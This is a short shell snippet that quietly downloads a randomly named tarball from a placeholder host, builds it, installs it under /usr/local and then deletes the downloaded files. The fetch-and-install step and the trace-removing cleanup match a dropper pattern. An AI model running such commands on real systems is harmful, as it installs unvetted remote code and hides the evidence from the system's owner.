cd /tmp && wget -q https://drop.example.io/njurwxxu.tar.gz
tar xzf njurwxxu.tar.gz
cd m92zhq || exit 1
./configure --prefix=/usr/local && make && make install
cd .. && rm -rf m92zhq njurwxxu.tar.gz
